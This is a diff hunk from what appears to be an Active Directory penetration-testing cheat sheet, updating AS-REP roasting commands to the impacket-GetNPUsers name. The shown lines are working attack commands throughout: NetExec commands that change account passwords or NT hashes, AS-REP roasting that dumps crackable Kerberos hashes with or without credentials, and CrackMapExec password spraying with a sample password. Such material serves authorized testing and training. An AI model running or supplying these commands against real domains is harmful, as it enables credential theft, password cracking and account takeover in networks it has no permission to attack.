@@ -65,9 +65,9 @@ nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
 nxc smb <ip> -u user -p pass -M change-password -o NEWNTHASH=31d6cfe0d16ae931b73c59d7e0c089c0
 
 # AS-REP Roasting — no creds needed if you have a valid username list
-GetNPUsers.py <domain.local>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+impacket-GetNPUsers <domain.local>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
 # or authenticated, dump all UF_DONT_REQUIRE_PREAUTH accounts
-GetNPUsers.py <domain.local>/<user>:<pass> -request -format hashcat -outputfile asrep.hash
+impacket-GetNPUsers <domain.local>/<user>:<pass> -request -format hashcat -outputfile asrep.hash
 
 # Password spraying (careful — lockout policy!)
 crackmapexec smb <DC_IP> -u users.txt -p 'Company2026!' --continue-on-success
